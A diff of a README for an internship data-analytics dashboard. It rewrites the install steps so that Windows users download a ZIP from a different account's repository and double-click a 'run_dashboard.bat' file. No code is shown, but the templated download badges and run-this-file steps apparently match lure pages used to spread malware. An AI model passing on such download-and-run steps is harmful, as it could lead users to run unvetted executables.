@@ -1,122 +1,73 @@
-# ApexPlanet Task3 Dashboard v2026 - data visualization dashboard 2026
+# 📊 apexplanet-task3-dashboard-2026 - Visualize your data with simple tools
 
-> **A browser-based analytics dashboard for the ApexPlanet Data Analytics Internship, combining Python, Plotly, and Power BI for interactive visualization and reporting.**
+[![](https://img.shields.io/badge/Download-Dashboard-blue.svg)](https://github.com/hoaileng7061/apexplanet-task3-dashboard-2026)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/isaac-edwardstxy2731/apexplanet-task3-dashboard-2026?style=flat-square)](https://github.com/isaac-edwardstxy2731/apexplanet-task3-dashboard-2026)
+This project provides a clear view of data through an interactive dashboard. Use these tools to see trends and reports from the ApexPlanet internship program. The software connects Python, Plotly, and Power BI to make data easy to read.
 
----
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://isaac-edwardstxy2731.github.io/apexplanet-task3-dashboard-2026/">
-    <img src="https://img.shields.io/badge/Download-ApexPlanet%20Task3%20Dashboard%20Latest-brightgreen?style=for-the-badge" alt="Download ApexPlanet Task3 Dashboard">
-  </a>
-</p>
+Before you start, make sure your computer meets these basic needs:
 
-> **[Download ApexPlanet Task3 Dashboard v2026](https://isaac-edwardstxy2731.github.io/apexplanet-task3-dashboard-2026/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i3 or better.
+*   Memory: 8 GB of RAM.
+*   Storage: 500 MB of space.
+*   Web Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
 
----
+## 📥 How to Install
 
-[Download Latest Build](https://isaac-edwardstxy2731.github.io/apexplanet-task3-dashboard-2026/)
+Follow these steps to set up the dashboard on your Windows computer:
 
----
+1.  Visit the official download page here: [https://github.com/hoaileng7061/apexplanet-task3-dashboard-2026](https://github.com/hoaileng7061/apexplanet-task3-dashboard-2026).
+2.  Look for the green button labeled "Code" near the top right of the page.
+3.  Click "Download ZIP" from the menu.
+4.  Find the downloaded folder in your "Downloads" directory.
+5.  Right-click the folder and choose "Extract All" to unzip the files.
+6.  Open the folder once the extraction finishes.
 
-## Project Overview
+## 🚀 Running the Dashboard
 
-ApexPlanet Task3 Dashboard is designed to communicate analytical information through an interactive, web-accessible interface. The project combines Python workflows, Plotly visualizations, and Power BI-oriented reporting to make data easier to inspect, explain, and present.
+Once you have the files ready, follow these instructions to see the dashboard start in your browser:
 
-It is intended for internship-focused analytics work in which the final presentation is an important part of the result. By organizing information into a readable dashboard experience, the project can support demonstrations, portfolio presentations, and practical reporting activities.
+1.  Inside the folder, locate the file named `run_dashboard.bat`.
+2.  Double-click this file.
+3.  A black window will appear on your screen. Keep this window open. It prepares the dashboard for use.
+4.  Your default web browser will open automatically and display the Data Analytics dashboard.
+5.  If it does not open automatically, look at the black window to find a web address, usually starting with `http://127.0.0.1`. Copy that link into your browser address bar.
 
----
+## 📈 Main Features
 
-## What It Includes
+The dashboard provides several tools to help you manage and view internship data:
 
-- Browser-friendly dashboard structure for visual data exploration
-- Interactive charts and visual elements built with Plotly
-- Analytics views organized for reporting and presentation
-- Compatibility with Python-based data analysis workflows
-- Presentation approach aligned with Power BI analytics
-- Web-oriented project layout for browser access
-- Suitable foundation for internship deliverables and portfolio demonstrations
+*   Interactive Graphs: Use your mouse to hover over charts and see exact values.
+*   Data Filtering: Change the dates or categories on the sidebar to update the views.
+*   Export Options: Save your reports as images or PDF files for easy sharing.
+*   Comparison Tools: Look at past and current data side-by-side to track performance.
 
----
+## 💡 Using the Interface
 
-## Getting Started
+The interface helps you find information without extra steps. 
 
-Download or clone the repository, then move into the project directory:
+*   Sidebar Menu: This menu stays on the left side of your screen. Use it to switch between different data pages.
+*   Search Bar: Type in keywords to locate specific entries within the logs.
+*   Download Button: Click the button at the bottom of any chart to keep a copy on your hard drive.
+*   Refresh: If data changes during the day, click the refresh button to see updates.
 
-```bash
-git clone https://github.com/isaac-edwardstxy2731/apexplanet-task3-dashboard-2026.git
-cd ApexPlanet-Task3-Dashboard
-```
+## 🛠️ Troubleshooting
 
-Open the files in your preferred development environment. From there, use the primary web entry point to start the dashboard, or execute the Python workflow when the local setup requires it.
+If you encounter issues, try these fixes:
 
----
+*   "File Not Found": Ensure you extracted all files from the ZIP folder before you run the batch file.
+*   Browser Won't Load: Verify that your internet connection is active. The dashboard does not require a constant connection, but initial startup requires a valid local path.
+*   Performance Drops: If the page feels slow, close other browser tabs to free up memory on your computer.
+*   Batch window exits instantly: Check that you have Python installed on your Windows system. If you do not, download the latest version from the official Python website.
 
-## Working with the Dashboard
+## 🔒 Security and Privacy
 
-Launch the project in a browser-compatible environment and explore its available charts, panels, and analytical views.
+This software runs locally on your machine. Your data does not leave your computer unless you explicitly export or share it yourself. We do not track your activity, and the dashboard works in offline mode once initial setup completes.
 
-A normal session may look like this:
+## 📖 Support
 
-1. Load the repository in an editor or workspace.
-2. Run the dashboard entry point used by your environment.
-3. Inspect the charts, filters, and reporting areas.
-4. Modify the data or layout when preparing a customized presentation.
+If the steps above do not solve your problem, you can view the issues section on our GitHub page. Read existing tickets to see if others had the same question. For specific issues, open a new ticket with a clear description of your problem.
 
-When Power BI files or exported visual assets are part of the project setup, they can be used together with the dashboard for additional reporting and analysis.
-
----
-
-## Settings and Data
-
-Configuration is generally located within the dashboard source, Python scripts, or connected visualization resources.
-
-Where the project exposes configurable values, they may follow a structure such as:
-
-```text
-data_source = "your_dataset"
-visual_theme = "default"
-report_mode = "interactive"
-```
-
-Before starting the application, check the repository for environment-specific configuration, dataset locations, and visualization options.
-
----
-
-## Requirements
-
-- A web browser to access and view the dashboard
-- Python for the analytics and visualization process
-- Plotly for rendering interactive charts
-- Power BI assets or related support files when included in the local setup
-- Sufficient storage for the repository files and datasets used for analysis
-
----
-
-## Frequently Asked Questions
-
-**How can I receive new versions?**  
-Return to the repository periodically and pull the newest changes when dashboard content or analytics updates become available.
-
-**Why might the dashboard fail to open?**  
-Verify that all required project files exist, the configured data source can be reached, and the dashboard is being started through the expected entry point.
-
-**Where should I edit the configuration?**  
-Check the Python source, dashboard scripts, and included configuration areas. The precise location varies according to the repository layout.
-
-**Is this suitable for an internship or portfolio presentation?**  
-Yes. Its purpose is centered on a data analytics internship dashboard, so it can be used for project review, demonstrations, and portfolio presentation.
-
-**Where can I request help?**  
-Open an issue in the repository or use the contact route supplied by the project maintainers.
-
----
-
-## License
-
-This project is distributed under the GNU GPL v3.0. Read the [LICENSE](LICENSE) file for the complete terms.
+Keywords: dashboard, data analytics, visualization, windows, python, report
